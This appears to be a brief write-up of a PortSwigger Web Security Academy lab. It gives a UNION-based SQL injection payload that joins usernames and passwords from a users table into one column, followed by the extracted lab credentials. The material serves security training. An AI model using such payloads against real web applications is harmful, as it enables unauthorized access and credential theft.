# Lab 

https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column

## Payload

```sql
/filter?category=Accessories' UNION SELECT NULL,username||','||password from users--
```

### Results

```
administrator, huf48d12wqjkxnfbz7fp
carlos, ikgpzbqyt5zenjte6mm5
wiener, m0pzyvltq388mhpdcdsv
```